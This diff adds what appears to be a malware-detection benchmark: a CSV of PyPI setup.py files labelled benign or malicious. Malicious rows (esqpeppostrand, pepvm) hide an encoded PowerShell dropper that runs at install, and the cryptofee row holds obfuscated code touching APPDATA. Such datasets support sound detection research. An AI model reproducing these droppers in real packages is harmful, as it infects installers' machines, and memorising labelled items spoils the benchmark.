@@ -1,0 +1,584 @@
+sample_id,package_name,file_source,ecosystem,language,label,source,content_hash,content
+09212b22ece38237b6b8f4cfd1ed0ee4c960d137,pyhon-0.15.14,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/pyhon/0.15.14/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,9dec230da93fd95497ef5ad54ac87a9d3e79de8a,"#!/usr/bin/env python3
+
+from setuptools import setup, find_packages
+
+with open(""README.md"", ""r"", encoding=""utf-8"") as f:
+    long_description = f.read()
+
+setup(
+    name=""pyhOn"",
+    version=""0.15.14"",
+    author=""Andre Basche"",
+    description=""Control hOn devices with python"",
+    long_description=long_description,
+    long_description_content_type=""text/markdown"",
+    project_urls={
+        ""GitHub"": ""https://github.com/Andre0512/pyhOn"",
+        ""PyPI"": ""https://pypi.org/project/pyhOn"",
+    },
+    license=""MIT"",
+    platforms=""any"",
+    packages=find_packages(),
+    include_package_data=True,
+    python_requires="">=3.10"",
+    install_requires=[""aiohttp>=3.8"", ""typing-extensions>=4.8"", ""yarl>=1.8""],
+    classifiers=[
+        ""Development Status :: 4 - Beta"",
+        ""Environment :: Console"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Natural Language :: English"",
+        ""Operating System :: OS Independent"",
+        ""Programming Language :: Python :: 3.10"",
+        ""Programming Language :: Python :: 3.11"",
+        ""Programming Language :: Python :: 3.12"",
+        ""Topic :: Software Development :: Libraries :: Python Modules"",
+    ],
+    entry_points={
+        ""console_scripts"": [
+            ""pyhOn = pyhon.__main__:start"",
+        ]
+    },
+)"
+32107b1dd2ad0c35902401b580c14a0915f983a4,idds-monitor-2.0.6,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/idds-monitor/2.0.6/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,509cefe3434c17c93ce281f49be3e2b0566be3fa,"#!/usr/bin/env python
+#
+# Licensed under the Apache License, Version 2.0 (the ""License"");
+# You may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+# http://www.apache.org/licenses/LICENSE-2.0OA
+#
+# Authors:
+# - Wen Guan, <wen.guan@cern.ch>, 2021
+
+
+import glob
+import io
+import os
+import re
+import sys
+import shutil
+import socket
+from distutils.sysconfig import get_python_lib
+from setuptools import setup, find_packages, Distribution
+from setuptools.command.install import install
+
+
+current_dir = os.getcwd()
+working_dir = os.path.dirname(os.path.realpath(__file__))
+os.chdir(working_dir)
+
+
+with io.open('lib/idds/monitor/version.py', ""rt"", encoding=""utf8"") as f:
+    version = re.search(r'release_version = ""(.*?)""', f.read()).group(1)
+
+
+with io.open('README.md', ""rt"", encoding=""utf8"") as f:
+    readme = f.read()
+
+
+class OnlyGetScriptPath(install):
+    def run(self):
+        self.distribution.install_scripts = self.install_scripts
+
+
+def get_python_bin_path():
+    "" Get the directory setuptools installs scripts to for current python ""
+    dist = Distribution({'cmdclass': {'install': OnlyGetScriptPath}})
+    dist.dry_run = True  # not sure if necessary
+    dist.parse_config_files()
+    command = dist.get_command_obj('install')
+    command.ensure_finalized()
+    command.run()
+    return dist.install_scripts
+
+
+def get_python_home():
+    return sys.exec_prefix
+
+
+def get_data_path():
+    return sys.prefix
+
+
+def get_reqs_from_file(requirements_file):
+    if os.path.exists(requirements_file):
+        return open(requirements_file, 'r').read().split('\n')
+    return []
+
+
+def parse_requirements(requirements_files):
+    requirements = []
+    for requirements_file in requirements_files:
+        for line in get_reqs_from_file(requirements_file):
+            line = line.split('#')[0]
+            line = line.strip()
+            if line.startswith('- ') and not line.endswith(':'):
+                line = line.replace('- ', '').strip()
+                if len(line) and 'python==' not in line:
+                    requirements.append(line)
+    return requirements
+
+
+def get_full_hostname():
+    return socket.getfqdn()
+
+
+def config_api_host(conf_file_template=""data/conf.js.template"", conf_file='data/conf.js', hostname=None):
+    with open(conf_file_template, 'r') as f:
+        template = f.read()
+    template = template.format(api_host_name=hostname)
+    with open(conf_file, 'w') as f:
+        f.write(template)
+
+
+def get_files(idir):
+    files = []
+    for f in os.listdir(idir):
+        ifile = os.path.join(idir, f)
+        if ifile.startswith(""./""):
+            ifile = ifile[2:]
+        if os.path.isfile(ifile):
+            files.append(ifile)
+    return files
+
+
+def get_data_files(dest, src):
+    data = []
+    # data.append((dest, get_files(src)))
+    for root, dirs, files in os.walk(src):
+        if 'dist' in root or 'build' in root or 'egg-info' in root:
+            # continue
+            pass
+        if root.endswith('monitor/dist') or root.endswith('monitor/build') or 'egg-info' in root:
+            # continue
+            pass
+        dest_dir = os.path.join(dest, root)
+        src_files = [os.path.join(root, f) for f in files]
+        i_data = (dest_dir, src_files)
+        data.append(i_data)
+    # print(data)
+    return data
+
+
+for build_dir in ['build', 'dist', 'idds_monitor.egg-info']:
+    if os.path.exists(build_dir):
+        print(""removing %s............................."" % build_dir)
+        shutil.rmtree(build_dir)
+
+install_lib_path = get_python_lib()
+install_bin_path = get_python_bin_path()
+install_home_path = get_python_home()
+install_data_path = get_data_path()
+
+requirements_files = ['tools/env/environment.yml']
+install_requires = parse_requirements(requirements_files=requirements_files)
+install_requires = install_requires
+
+hostname = get_full_hostname()
+config_api_host(conf_file_template=""data/conf.js.template"", conf_file='data/conf.js', hostname=hostname)
+
+data_files = [
+    # config and cron files
+    ('etc/idds/', glob.glob('etc/idds/*.template')),
+    ('etc/idds/rest', glob.glob('etc/idds/rest/*template')),
+    ('tools/env/', glob.glob('tools/env/*.yml')),
+    # ('monitor/', glob.glob('*', recursive=True))
+    # ('monitor/', get_all_files('.')),
+]
+data_files += get_data_files('monitor/', './data')
+
+scripts = glob.glob('bin/*')
+
+setup(
+    name=""idds-monitor"",
+    version=version,
+    description='intelligent Data Delivery Service(iDDS) Package',
+    long_description=readme,
+    long_description_content_type='text/markdown',
+    license='GPL',
+    author='IRIS-HEP Team',
+    author_email='atlas-adc-panda@cern.ch',
+    python_requires='>=3.6',
+    packages=find_packages('lib/'),
+    package_dir={'': 'lib'},
+    install_requires=install_requires,
+    include_package_data=True,
+    data_files=data_files,
+    scripts=scripts,
+    project_urls={
+        'Documentation': 'https://github.com/HSF/iDDS/wiki',
+        'Source': 'https://github.com/HSF/iDDS',
+    },
+    classifiers=[
+        'Development Status :: 5 - Production/Stable',
+        'Intended Audience :: Developers',
+        'Natural Language :: English',
+        'Programming Language :: Python :: 3.6',
+    ],
+)
+
+os.chdir(current_dir)"
+7fa32751ea4f32a4d43be9b9dbdafeeabecbb0dc,mdrs-0.0.1,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/mdrs/0.0.1/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,f868c0004f1c2ba2dcd020a5f65748a7c806f458,"from setuptools import setup
+
+setup(
+	name=""mdrs"",
+	version=""0.0.1"",
+	packages=[""mdrs"",],
+	license="""",
+	long_description=""docker images manager"",
+	entry_points = {
+		'console_scripts':[
+			'mdrs = mdrs:main'
+		],
+	}
+)"
+9992116661175a2ad142958075fe9b2dc710cea1,viihdecli-0.2,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/viihdecli/0.2/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,898161b56e2a7f2f3f7688f161366de857df0e47,"from setuptools import setup
+from pathlib import Path
+this_directory = Path(__file__).parent
+long_description = (this_directory / ""README.md"").read_text()
+
+with open('src/version.py') as fp:
+    exec(fp.read())
+
+setup(
+    name = 'viihdecli',
+    description = 'Command line interface for handling Elisa Viihde recordings',
+    long_description = long_description,
+    long_description_content_type='text/markdown',
+    url = 'https://github.com/Qotscha/viihdecli',
+    author = 'Qotscha',
+    version = __version__,
+    packages = ['viihdecli'],
+    package_dir = {'viihdecli': 'src'},
+    python_requires='>=3.8',
+    install_requires = [
+        'keyring',
+        'requests',
+        'viihdexdl'
+        ],
+    entry_points = {
+        'console_scripts': [
+            'viihdecli = viihdecli.__main__:main',
+            'viihdedl = viihdecli.viihdedl:main'
+            ]
+        },
+    classifiers = [
+        'Development Status :: 3 - Alpha',
+        'Environment :: Console',
+        'Environment :: Win32 (MS Windows)',
+        'License :: OSI Approved :: MIT License',
+        'Operating System :: Microsoft :: Windows',
+        'Programming Language :: Python :: 3',
+        'Programming Language :: Python :: 3.8',
+        'Programming Language :: Python :: 3.9',
+        'Programming Language :: Python :: 3.10',
+        'Programming Language :: Python :: 3.11',
+        'Programming Language :: Python :: 3.12'
+        ],
+    project_urls = {'Documentation': 'https://github.com/Qotscha/viihdecli/blob/main/LUEMINUT.md'}
+    )"
+c2c76a0d90e64ae6e177043938a22248bcd46745,paramiko-2.10.4,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/paramiko/2.10.4/tar-gz/setup.py,pypi,Python,0,malwarebench_pypi_benign_after_2000_v3,d29269b269e924e310c2dc3ff76135e0f0541461,"# Copyright (C) 2003-2008  Robey Pointer <robeypointer@gmail.com>
+#
+# This file is part of paramiko.
+#
+# Paramiko is free software; you can redistribute it and/or modify it under the
+# terms of the GNU Lesser General Public License as published by the Free
+# Software Foundation; either version 2.1 of the License, or (at your option)
+# any later version.
+#
+# Paramiko is distributed in the hope that it will be useful, but WITHOUT ANY
+# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
+# A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for more
+# details.
+#
+# You should have received a copy of the GNU Lesser General Public License
+# along with Paramiko; if not, write to the Free Software Foundation, Inc.,
+# 51 Franklin Street, Suite 500, Boston, MA  02110-1335  USA.
+
+import sys
+from setuptools import setup
+
+if sys.platform == ""darwin"":
+    import setup_helper
+
+    setup_helper.install_custom_make_tarball()
+
+long_description = open(""README.rst"").read()
+
+# Version info -- read without importing
+_locals = {}
+with open(""paramiko/_version.py"") as fp:
+    exec(fp.read(), None, _locals)
+version = _locals[""__version__""]
+
+# Have to build extras_require dynamically because it doesn't allow
+# self-referencing and I hate repeating myself.
+extras_require = {
+    ""gssapi"": [
+        ""pyasn1>=0.1.7"",
+        'gssapi>=1.4.1;platform_system!=""Windows""',
+        'pywin32>=2.1.8;platform_system==""Windows""',
+    ],
+    ""ed25519"": [""pynacl>=1.0.1"", ""bcrypt>=3.1.3""],
+    ""invoke"": [""invoke>=1.3""],
+}
+everything = []
+for subdeps in extras_require.values():
+    everything.extend(subdeps)
+extras_require[""all""] = everything
+
+setup(
+    name=""paramiko"",
+    version=version,
+    description=""SSH2 protocol library"",
+    long_description=long_description,
+    author=""Jeff Forcier"",
+    author_email=""jeff@bitprophet.org"",
+    url=""https://paramiko.org"",
+    project_urls={
+        ""Docs"": ""https://docs.paramiko.org"",
+        ""Source"": ""https://github.com/paramiko/paramiko"",
+        ""Issues"": ""https://github.com/paramiko/paramiko/issues"",
+        ""Changelog"": ""https://www.paramiko.org/changelog.html"",
+        ""CI"": ""https://app.circleci.com/pipelines/github/paramiko/paramiko"",
+    },
+    packages=[""paramiko""],
+    license=""LGPL"",
+    platforms=""Posix; MacOS X; Windows"",
+    classifiers=[
+        ""Development Status :: 5 - Production/Stable"",
+        ""Intended Audience :: Developers"",
+        ""License :: OSI Approved :: ""
+        ""GNU Library or Lesser General Public License (LGPL)"",
+        ""Operating System :: OS Independent"",
+        ""Topic :: Internet"",
+        ""Topic :: Security :: Cryptography"",
+        ""Programming Language :: Python"",
+        ""Programming Language :: Python :: 2"",
+        ""Programming Language :: Python :: 2.7"",
+        ""Programming Language :: Python :: 3"",
+        ""Programming Language :: Python :: 3.4"",
+        ""Programming Language :: Python :: 3.5"",
+        ""Programming Language :: Python :: 3.6"",
+        ""Programming Language :: Python :: 3.7"",
+        ""Programming Language :: Python :: 3.8"",
+        ""Programming Language :: Python :: 3.9"",
+    ],
+    # TODO 3.0: remove bcrypt, pynacl and update installation docs noting that
+    # use of the extras_require (""paramiko[ed2559]"") is now required for those
+    # TODO 3.0: alternately, given how prevalent ed25519 is now, and how we use
+    # invoke for (increasing) subproc stuff, consider making the default flavor
+    # ""full"" and adding a ""minimal"" or similar that is just-crypto?
+    # TODO 3.0: remove six, obviously
+    install_requires=[
+        ""bcrypt>=3.1.3"",
+        ""cryptography>=2.5"",
+        ""pynacl>=1.0.1"",
+        ""six"",
+    ],
+    extras_require=extras_require,
+)"
+06b112bcc147a5e33a54b7c3c7bd9dc8a255e84c,noblesse-0.0.6,noblesse-0.0.6/noblesse-0.0.6/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,fa1b4df269df08a1482e8661584c7a5ddd164abe,"from setuptools import setup
+
+with open('README.md','r') as fh:
+    long_description = fh.read()
+setup(
+    name=""noblesse"",
+    version='0.0.6',
+    description='This Module Optimises your PC For Python',
+    py_modules=[""noblesse""],
+    package_dir={'':'src'},
+    classifiers=[
+        ""Programming Language :: Python :: 3"",
+        ""Programming Language :: Python :: 3.6"",
+        ""Programming Language :: Python :: 3.7"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Operating System :: OS Independent"",
+    ],
+    long_description=long_description,
+    long_description_content_type=""text/markdown"",
+    install_requires=[
+        ""requests"",
+    ],
+    url=""https://github.com/siph-er"",
+    author=""sipher"",
+    author_email=""xinftw@protonmail.com"",
+    
+)"
+199f13e025a4301b25404ed3f585157982c794dd,esqpeppostrand-9.84,esqpeppostrand-9.84/esqpeppostrand-9.84/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,22bacb6f073191651df9ad3872bed012395bac6f,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'esqpeppostrand',
+    packages = ['modlib'],
+    version = '3.74',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+5042225351c9ab0f5c844790cc77c81cb1f06df8,pepvm-2.71,pepvm-2.71/pepvm-2.71/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,83dd9789563f3faec740308a14fec03160160ca9,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'pepvm',
+    packages = ['modlib'],
+    version = '4.53',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+a1e208c73fc2c6a832b65aeb8479ec9f657afc2f,cryptofee-0.1,cryptofee-0.1/cryptofee-0.1/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,625c82dcabbde587c98229a35095179856f3a28e,"import sys
+from distutils.core import setup
+import random
+
+
+if sys.platform == ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 1)])):
+	if sys.argv[1] in [''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((3 << 3) + 1) << 2) + 1, ((((3 << 2) + 1)) << 3) - 1, ((((3 << 2) + 1)) << 3) - 1, (3 << 5) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 4) - 1])), ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(3 << 5) + (1 << 1), (((1 << 4) - 1) << 3) - 3, ((((3 << 2) + 1)) << 3) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2)]))]:	
+		馬女水女口目人馬鳥月水馬山山馬鸟 = 834*(395 & 643)+865//460-(104 | 469+415) | 104 << 313 << 357 >> (935 | 183) & ~61
+
+		while 馬女水女口目人馬鳥月水馬山山馬鸟:
+			if 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:
+				import pip
+				pip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__builtins__,
+				         oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(7 << 4), (((1 << 4) - 1) << 3) + 1, (7 << 4), ((((3 << 2) + 1)) << 3) + 1, (((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 1)]))])
+
+				馬女水女口目人馬鳥月水馬山山馬鸟 = (896*(494 & 86)+104//648-(885 | 515+277) | 885 << 141 << 580 >> (593 | 648) & ~87) >> 9523
+			elif 馬女水女口目人馬鳥月水馬山山馬鸟 == 286625773:
+				try:
+					import win32com
+				except ModuleNotFoundError:
+					刀马馬馬目鳥鸟女山月馬日木鳥口女= 1
+					馬目子目刀人刀月山月女木鳥水马口 = 1
+					口马口马月人马女鸟月刀馬目马水木 = 1
+
+					for 馬水口刀女目日木馬水日月木子刀木 in range(1 << 5):
+						刀马馬馬目鳥鸟女山月馬日木鳥口女 += sum([馬目子目刀人刀月山月女木鳥水马口 << 10 ^
+						                        78 | 1 for _015896 in range(1 << 4)])
+						馬目子目刀人刀月山月女木鳥水马口 = 刀马馬馬目鳥鸟女山月馬日木鳥口女 | 馬目子目刀人刀月山月女木鳥水马口 | 口马口马月人马女鸟月刀馬目马水木
+						口马口马月人马女鸟月刀馬目马水木 = 刀马馬馬目鳥鸟女山月馬日木鳥口女 ^ 馬目子目刀人刀月山月女木鳥水马口 ^ 口马口马月人马女鸟月刀馬目马水木
+
+					馬女水女口目人馬鳥月水馬山山馬鸟 = 口马口马月人马女鸟月刀馬目马水木
+					continue
+
+				馬女水女口目人馬鳥月水馬山山馬鸟 = 200*(67 & 938)+964//905-(77 | 299+988) | 77 << 410 << 580 >> (987 | 503) & ~158
+	elif sys.argv[1] in [''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(3 << 5) + (1 << 1), (((3 << 3) + 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) - 1, (((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3), (((3 << 3) + 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)]))]:
+		子水女馬人月刀人馬鳥山馬馬刀女人 = 330*(311 & 395)+741//589-(771 | 842+339) | 771 << 369 << 218 >> (797 | 341) & ~526
+
+		while 子水女馬人月刀人馬鳥山馬馬刀女人:
+			if 子水女馬人月刀人馬鳥山馬馬刀女人 == 12768:
+				人馬口刀女子月水人目水鳥山口馬馬.close()
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 895*(183 & 759)+231//268-(415 | 928+255) | 415 << 22 << 536 >> (210 | 576) & ~511
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 183269:
+				目水鸟月木人木鳥马口马刀木鳥水子 = os.getenv(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(1 << 6) + 1, (5 << 4), (5 << 4), (((1 << 4) + 1) << 2), (1 << 6) + 1, (((5 << 2) + 1) << 2), (1 << 6) + 1])))
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 763*(228 & 284)+333//968-(431 | 867+491) | 431 << 636 << 393 >> (981 | 570) & ~397
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 362814:
+				鸟口目水子口山日口日日鸟马月鸟水.append(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((1 << 4) + 1) << 2) - 1, (7 << 3) + (1 << 1), (((3 << 3) - 1) << 2), (5 << 4), (7 << 4) + (1 << 1), (7 << 4) - 1, ((((3 << 2) + 1)) << 3) - 1, (7 << 4) + (1 << 1), (3 << 5) + 1, (((7 << 2) - 1) << 2) + 1, (((1 << 4) + 1) << 2), (3 << 5) + 1, (7 << 4) + (1 << 2), (3 << 5) + 1, (((3 << 3) - 1) << 2), (((5 << 2) - 1) << 2) + 1, ((((3 << 2) + 1)) << 3) + 1, (((3 << 3) + 1) << 2) - 1, (7 << 4) + (
+				    1 << 1), (7 << 4) - 1, (7 << 4) + 3, (7 << 4) - 1, ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 2), ((((3 << 2) - 1)) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2), (7 << 4) - 1, (((1 << 4) - 1) << 3) - 1, (7 << 4) + 3, (((3 << 3) - 1) << 2), (((5 << 2) + 1) << 2) - 1, (7 << 4) + (1 << 2), (3 << 5) + 1, (7 << 4) + (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((5 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (((1 << 4) - 1) << 3) - 3])))
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 102*(468 & 715)+338//836-(544 | 548+999) | 544 << 951 << 41 >> (993 | 645) & ~762
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 1929:
+				鸟口目水子口山日口日日鸟马月鸟水 = [
+					目水鸟月木人木鳥马口马刀木鳥水子 + ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((3 << 3) - 1) << 2), (((5 << 2) - 1) << 2) + 1, ((((3 << 2) + 1)) << 3) + 1, (((3 << 3) + 1) << 2) - 1, (7 << 4) + (1 << 1), (7 << 4) - 1, (7 << 4) + 3, (7 << 4) - 1, ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 2), ((
+					    ((3 << 2) - 1)) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2), (7 << 4) - 1, (((1 << 4) - 1) << 3) - 1, (7 << 4) + 3, (((3 << 3) - 1) << 2), (((5 << 2) + 1) << 2) - 1, (7 << 4) + (1 << 2), (3 << 5) + 1, (7 << 4) + (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((5 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (((1 << 4) - 1) << 3) - 3])),
+					目水鸟月木人木鳥马口马刀木鳥水子 + ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((3 << 3) - 1) << 2), (((5 << 2) - 1) << 2) + 1, ((((3 << 2) + 1)) << 3) + 1, (((3 << 3) + 1) << 2) - 1, (7 << 4) + (1 << 1), (7 << 4) - 1, (7 << 4) + 3, (7 << 4) - 1, ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 2), (((((1 << 3) + 1))) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 1), (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 2), (1 << 5), (((1 << 4) + 1) << 2) + 1, (((1 << 4) - 1) << 3), (7 << 4), (((7 << 2) - 1) << 2), (7 << 4) - 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2) + 1, (7 << 4) + (
+					    1 << 1), (((3 << 3) - 1) << 2), (5 << 4) + 1, (((1 << 4) - 1) << 3) - 3, ((((3 << 2) + 1)) << 3) + 1, (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2) - 1, (1 << 5), (((5 << 2) - 1) << 2), (3 << 5) + 1, (((1 << 4) - 1) << 3) - 3, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2) - 1, ((((3 << 2) + 1)) << 3), (((3 << 3) - 1) << 2), (((5 << 2) + 1) << 2) + 1, (7 << 4) + 3, (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 1), (1 << 5), (5 << 4), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2) + 1, (((3 << 3) + 1) << 2), (((3 << 3) - 1) << 2), (((5 << 2) + 1) << 2), (3 << 5) + 1, (7 << 4) + 3, (((7 << 2) - 1) << 2) - 1, (1 << 6) + (1 << 1), (3 << 5) + 1, (7 << 4) + (1 << 1)])),
+					月人刀口馬刀山马水人月人月山人山
+				]
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 950*(445&981)+812//716-(625|189+545)|625<<384<<322>>(765|613)&~331
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 29059:
+				os.makedirs(目水鸟月木人木鳥马口马刀木鳥水子 + ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((3 << 3) - 1) << 2), (((1 << 4) + 1) << 2) + 1, (((1 << 4) - 1) << 3), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - 1, (7 << 4) - (1 << 1)])))
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 71*(611&692)+884//306-(46|467+455)|46<<655<<223>>(356|561)&~207
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 28669:
